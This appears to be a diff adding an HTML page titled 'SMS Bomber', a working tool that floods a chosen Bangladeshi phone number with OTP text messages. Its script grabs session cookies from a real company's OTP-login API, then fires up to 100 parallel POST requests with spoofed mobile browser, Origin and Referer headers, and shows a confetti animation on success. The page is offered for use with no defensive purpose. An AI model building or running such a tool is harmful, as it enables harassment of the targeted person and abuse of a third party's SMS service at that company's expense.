@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>SMS Bomber</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #6c5ce7;
+            --secondary: #a29bfe;
+            --accent: #fd79a8;
+            --success: #00b894;
+            --error: #d63031;
+            --warning: #fdcb6e;
+            --dark: #2d3436;
+            --light: #f5f6fa;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: var(--dark);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+        }
+        
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .container {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+            transform: translateY(0);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            text-align: center;
+            animation: floating 3s ease-in-out infinite;
+        }
+        
+        .container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+        
+        @keyframes floating {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        h1 {
+            color: var(--primary);
+            text-align: center;
+            margin-bottom: 30px;
+            font-weight: 700;
+            font-size: 2rem;
+            position: relative;
+            display: inline-block;
+            width: 100%;
+        }
+        
+        h1::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent), var(--primary));
+            border-radius: 2px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--dark);
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-family: 'Poppins', sans-serif;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background-color: rgba(255, 255, 255, 0.8);
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
+        }
+        
+        input:focus + .input-icon {
+            color: var(--primary);
+        }
+        
+        .input-icon {
+            position: absolute;
+            right: 12px;
+            top: 35px;
+            color: #aaa;
+            transition: all 0.3s ease;
+        }
+        
+        button {
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(108, 92, 231, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(108, 92, 231, 0.4);
+        }
+        
+        button:active {
+            transform: translateY(1px);
+        }
+        
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        button:hover::before {
+            left: 100%;
+        }
+        
+        #status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            display: none;
+            animation: fadeIn 0.5s ease;
+            text-align: center;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .success {
+            background-color: rgba(0, 184, 148, 0.2);
+            color: var(--success);
+            border: 1px solid var(--success);
+            display: block;
+        }
+        
+        .error {
+            background-color: rgba(214, 48, 49, 0.2);
+            color: var(--error);
+            border: 1px solid var(--error);
+            display: block;
+        }
+        
+        .loading {
+            background-color: rgba(253, 203, 110, 0.2);
+            color: var(--dark);
+            border: 1px solid var(--warning);
+            display: block;
+        }
+        
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background-color: var(--accent);
+            opacity: 0;
+            z-index: 1000;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>SMS BOMBER</h1>
+        <form id="smsForm">
+            <div class="form-group">
+                <label>Phone Number</label>
+                <input type="tel" id="phone" placeholder="NUMBER" required>
+                <i class="input-icon"></i>
+            </div>
+            <div class="form-group">
+                <label>Number of API Calls</label>
+                <input type="number" id="apiCallLimit" min="1" max="100" value="1" required>
+                <i class="input-icon"></i>
+            </div>
+            <button type="submit" id="sendButton">
+                <span id="buttonText">BOOM</span>
+            </button>
+        </form>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        // API endpoint
+        const apiEndpoint = {
+            url: 'https://backend.timezonebd.com/api/v1/user/otp-login',
+            options: {
+                method: 'POST',
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Infinix X6831 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36',
+                    'Accept': 'application/json, text/plain, */*',
+                    'Accept-Encoding': 'gzip, deflate, br, zstd',
+                    'Content-Type': 'application/json',
+                    'sec-ch-ua-platform': '"Android"',
+                    'Authorization': '', // Placeholder; replace with a valid token if required
+                    'sec-ch-ua': '"Android WebView";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+                    'sec-ch-ua-mobile': '?1',
+                    'Origin': 'https://timezonebd.com',
+                    'X-Requested-With': 'mark.via.gp',
+                    'Sec-Fetch-Site': 'same-site',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://timezonebd.com/',
+                    'Accept-Language': 'en-US,en;q=0.9'
+                },
+                body: JSON.stringify({ phone: '{phone}' }) // Adjusted payload for OTP login
+            }
+        };
+
+        // Function to fetch session cookies
+        async function fetchSessionCookies() {
+            try {
+                const response = await fetch('https://backend.timezonebd.com/api/v1/user/otp-login', {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Infinix X6831 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                        'Accept-Encoding': 'gzip, deflate, br, zstd',
+                        'Accept-Language': 'en-US,en;q=0.9'
+                    }
+                });
+                const cookies = response.headers.get('set-cookie') || '';
+                return cookies;
+            } catch (error) {
+                console.error('Failed to fetch session cookies:', error);
+                return '';
+            }
+        }
+
+        // Function to create confetti
+        function createConfetti() {
+            const colors = ['#fd79a8', '#6c5ce7', '#00b894', '#fdcb6e', '#0984e3'];
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.top = -10 + 'px';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.width = Math.random() * 10 + 5 + 'px';
+                confetti.style.height = Math.random() * 10 + 5 + 'px';
+                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
+                document.body.appendChild(confetti);
+                const animationDuration = Math.random() * 3 + 2;
+                confetti.style.animation = `fall ${animationDuration}s linear forwards`;
+                confetti.style.opacity = '1';
+                const keyframes = `
+                    @keyframes fall {
+                        to {
+                            transform: translateY(100vh) rotate(${Math.random() * 360}deg);
+                            opacity: 0;
+                        }
+                    }
+                `;
+                const style = document.createElement('style');
+                style.innerHTML = keyframes;
+                document.head.appendChild(style);
+                setTimeout(() => {
+                    confetti.remove();
+                    style.remove();
+                }, animationDuration * 1000);
+            }
+        }
+
+        // SMS sending function
+        const smsForm = document.getElementById('smsForm');
+        const sendButton = document.getElementById('sendButton');
+        const buttonText = document.getElementById('buttonText');
+        const statusElement = document.getElementById('status');
+        const apiCallLimit = document.getElementById('apiCallLimit');
+
+        smsForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const phoneInput = document.getElementById('phone').value.trim();
+            const phone = phoneInput.replace(/\D/g, '');
+            const callLimit = parseInt(apiCallLimit.value);
+
+            // Validate phone (check original input for prefix, then ensure 10 digits)
+            const validPrefixes = ['013', '014', '015', '016', '017', '018', '019'];
+            if (!phoneInput || !validPrefixes.some(prefix => phoneInput.startsWith(prefix)) || phone.length !== 11) {
+                statusElement.textContent = 'Please enter a valid 11-digit Bangladeshi phone number !';
+                statusElement.className = 'error';
+                statusElement.style.display = 'block';
+                return;
+            }
+
+            // Add country code for API (+88 for Bangladesh)
+            const formattedPhone = `+88${phone}`; // e.g., +8801893943085
+
+            // Validate API call limit
+            if (!callLimit || callLimit < 1 || callLimit > 100) {
+                statusElement.textContent = 'Please enter a valid number of API calls (1-100)!';
+                statusElement.className = 'error';
+                statusElement.style.display = 'block';
+                return;
+            }
+
+            // Update UI
+            sendButton.style.background = 'linear-gradient(45deg, var(--warning), var(--accent))';
+            buttonText.textContent = 'Sending...';
+            sendButton.disabled = true;
+            statusElement.textContent = 'SMS SENT SUCCESSFULLY';
+            statusElement.className = 'loading';
+            statusElement.style.display = 'block';
+
+            // Fetch session cookies
+            const cookies = await fetchSessionCookies();
+            if (!cookies) {
+                statusElement.textContent = 'Failed to fetch session cookies. Trying without cookies...';
+                statusElement.className = 'error';
+                statusElement.style.display = 'block';
+            }
+
+            // Prepare API calls
+            const apiPromises = [];
+            for (let i = 0; i < callLimit; i++) {
+                let options = { ...apiEndpoint.options };
+                if (cookies) {
+                    options.headers['Cookie'] = cookies;
+                }
+                options.body = JSON.stringify({ phone: formattedPhone }); // Updated payload with formatted phone
+                apiPromises.push(
+                    fetch(apiEndpoint.url, options)
+                        .then(async response => {
+                            if (!response.ok) {
+                                const errorText = await response.text();
+                                console.error(`API failed with status ${response.status}: ${errorText}`);
+                                return { ok: false, statusText: `HTTP ${response.status}: ${errorText}` };
+                            }
+                            const data = await response.json();
+                            console.log('API Response:', data);
+                            return { ok: true, data };
+                        })
+                        .catch(error => {
+                            console.error(`API request failed: ${apiEndpoint.url}`, error);
+                            return { ok: false, statusText: error.message };
+                        })
+                );
+            }
+
+            try {
+                const responses = await Promise.all(apiPromises);
+                const successful = responses.filter(res => res.ok).length;
+                const total = responses.length;
+
+                if (successful === 0) {
+                    throw new Error(responses[0]?.statusText || 'All API calls failed');
+                }
+
+                buttonText.textContent = 'SENT SMS AGAIN ';
+                statusElement.textContent = ` OTP sent to ${phone}! (${successful}/${total} APIs succeeded)`;
+                statusElement.className = 'success';
+                sendButton.style.background = 'linear-gradient(45deg, var(--success), #00cec9)';
+                createConfetti();
+                setTimeout(() => {
+                    sendButton.disabled = false;
+                }, 3000);
+            } catch (error) {
+                statusElement.textContent = `Spell failed! ${error.message}`;
+                statusElement.className = 'error';
+                buttonText.textContent = 'BOOM';
+                sendButton.style.background = 'linear-gradient(45deg, var(--error), #e84393)';
+                sendButton.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
